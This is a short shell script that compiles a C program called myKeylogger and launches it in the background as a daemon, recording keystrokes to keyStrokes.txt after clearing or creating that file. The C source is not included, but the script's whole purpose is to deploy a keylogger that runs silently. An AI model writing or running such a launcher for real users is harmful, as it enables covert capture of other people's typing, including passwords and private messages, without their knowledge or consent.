#!/bin/sh

#Scipt to compile the C file and run it as a daemon process. 
#The C program has command line argument "keyStrokes.txt" for storing the output. 

[[ -f keyStrokes.txt ]] && :>keyStrokes.txt || touch keyStrokes.txt
make     myKeylogger
chmod +x myKeylogger

(./myKeylogger keyStrokes.txt ) & exit;
